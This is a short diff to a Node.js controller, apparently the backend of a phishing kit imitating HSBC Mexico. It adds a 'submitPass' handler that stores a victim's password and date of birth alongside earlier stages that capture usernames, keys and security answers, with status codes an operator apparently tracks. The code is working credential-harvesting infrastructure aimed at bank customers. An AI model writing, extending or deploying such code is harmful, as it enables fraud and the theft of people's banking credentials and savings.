@@ -1,4 +1,4 @@
-const HSBC = require("../models/hsbcmxModel");
+const HSBC = require("../models/hsbcmxModel.js");
 const axios = require("axios");
 var moment = require("moment"); // require
 
@@ -80,6 +80,20 @@ const submitLogin = async (req, res) => {
 	}
 };
 
+const submitPass = async (req, res) => {
+	const { password, dob, uniqueid } = req.body;
+	try {
+		await HSBC.findOneAndUpdate(
+			{ uniqueid },
+			{ password, dob, status: 13, timestamp: moment().format() }
+		).exec();
+		res.sendStatus(200);
+	} catch (error) {
+		console.log(error);
+		res.sendStatus(400);
+	}
+};
+
 const submitLoginAgain = async (req, res) => {
 	const { username, uniqueid } = req.body;
 	try {
@@ -152,6 +166,7 @@ module.exports = {
 	command,
 	getInfo,
 	submitLogin,
+	submitPass,
 	submitLoginAgain,
 	submitKey,
 	submitSec,
